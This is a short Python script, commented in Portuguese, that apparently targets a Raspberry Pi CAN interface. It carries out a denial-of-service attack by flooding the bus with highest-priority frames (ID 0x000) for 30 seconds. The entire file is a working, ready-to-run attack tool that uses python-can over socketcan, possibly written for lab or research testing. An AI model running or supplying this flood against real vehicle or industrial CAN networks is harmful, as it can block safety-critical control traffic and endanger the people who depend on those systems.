import can
import time
import os

# --- Parâmetros do Ataque ---

# Nome da interface CAN na Raspberry Pi
CAN_INTERFACE = 'can0'

# ID da mensagem de ataque. IDs com valor mais baixo têm prioridade mais alta.
# 0x000 é a maior prioridade possível no CAN, ideal para um ataque DoS.
ATTACK_ID = 0x000

# Dados (payload) da mensagem de ataque. 8 bytes de dados aleatórios.
ATTACK_DATA = [0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF]

# Duração do ataque em segundos.
ATTACK_DURATION_SECONDS = 30

# --- Lógica do Ataque ---

def run_dos_attack():
    """
    Inicia a inundação do barramento CAN com mensagens de alta prioridade
    para causar uma negação de serviço.
    """
    print("Iniciando o ataque de Negação de Serviço (DoS)...")
    print(f"Interface: {CAN_INTERFACE}")
    print(f"ID da Mensagem de Ataque: {hex(ATTACK_ID)}")
    print(f"Duração: {ATTACK_DURATION_SECONDS} segundos")
    
    bus = None  # Inicializa a variável do barramento
    try:
        # Inicializa a conexão com o barramento CAN usando a interface socketcan
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        
        # Cria a mensagem maliciosa que será enviada repetidamente
        msg = can.Message(
            arbitration_id=ATTACK_ID,
            data=ATTACK_DATA,
            is_extended_id=False
        )
        
        # Registra o tempo de início para controlar a duração do ataque
        start_time = time.time()
        message_count = 0
        
        # Loop que envia a mensagem o mais rápido possível pela duração definida
        while time.time() - start_time < ATTACK_DURATION_SECONDS:
            bus.send(msg)
            message_count += 1
            # Um pequeno delay pode ser adicionado aqui se necessário para evitar
            # sobrecarga total do buffer do sistema operacional, mas para um DoS puro,
            # não usamos delay. Ex: time.sleep(0.0001)
            
        end_time = time.time()
        
        print("\n--- Ataque Finalizado ---")
        print(f"Duração total: {end_time - start_time:.2f} segundos.")
        print(f"Total de mensagens enviadas: {message_count}")
        
    except Exception as e:
        print(f"Ocorreu um erro: {e}")
        print("Verifique se a interface CAN está configurada e ativa ('sudo ip link set can0 up ...').")
        
    finally:
        # Garante que o barramento seja desligado corretamente ao final
        if bus:
            bus.shutdown()
            print("Conexão com o barramento CAN foi encerrada.")

if __name__ == "__main__":
    run_dos_attack()